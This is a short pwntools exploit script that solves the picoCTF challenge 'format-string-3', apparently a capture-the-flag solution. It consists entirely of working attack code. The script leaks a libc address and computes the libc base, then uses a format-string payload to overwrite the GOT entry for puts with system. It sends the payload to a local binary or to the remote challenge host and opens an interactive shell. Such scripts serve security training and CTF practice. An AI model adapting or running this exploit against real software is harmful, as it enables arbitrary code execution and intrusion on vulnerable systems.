from pwn import *

context.arch = 'amd64'

TARGET = './format-string-3'
libc = ELF('./libc.so.6')
HOST = 'rhea.picoctf.net'
PORT = 55740

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

p.recvuntil(b"libc: ")
leak_libc = int(p.recvline().strip(), 16)
log.success(f"leak libc: {hex(leak_libc)}")

libc.address = leak_libc - 0x7a3f0
log.success(f"base libc: {hex(libc.address)}")

system = libc.sym['system']

log.success(f"system: {hex(system)}")

offset = 38

got_puts = 0x404018

payload = fmtstr_payload(offset, {got_puts: system})

p.sendline(payload)

p.interactive()